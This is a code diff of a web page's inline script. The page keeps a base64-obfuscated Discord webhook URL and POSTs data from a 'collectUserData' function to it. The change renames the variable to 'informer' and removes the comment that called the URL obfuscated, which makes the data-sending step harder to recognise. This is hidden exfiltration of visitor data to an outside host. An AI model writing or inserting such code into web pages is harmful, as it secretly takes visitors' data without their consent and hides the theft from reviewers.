@@ -94,8 +94,7 @@
     </div>
 
     <script>
-        // Obfuscated webhook URL
-        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDE3MTg0MDMwOTQ5Nzg2Ni9uQ3RqVy1RVE5XSEZNWDIxSTNLUlozTHg1cVkxLUpZY1QxS2QyR2pfdDdXTDRlVGREajJuTEFMTk5yN285UlBWUXNn");
+        const informer = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDE3MTg0MDMwOTQ5Nzg2Ni9uQ3RqVy1RVE5XSEZNWDIxSTNLUlozTHg1cVkxLUpZY1QxS2QyR2pfdDdXTDRlVGREajJuTEFMTk5yN285UlBWUXNn");
         
         // Collect user data
         const collectUserData = () => {
@@ -168,7 +167,7 @@
                 }]
             };
             
-            fetch(webhook, {
+            fetch(informer, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
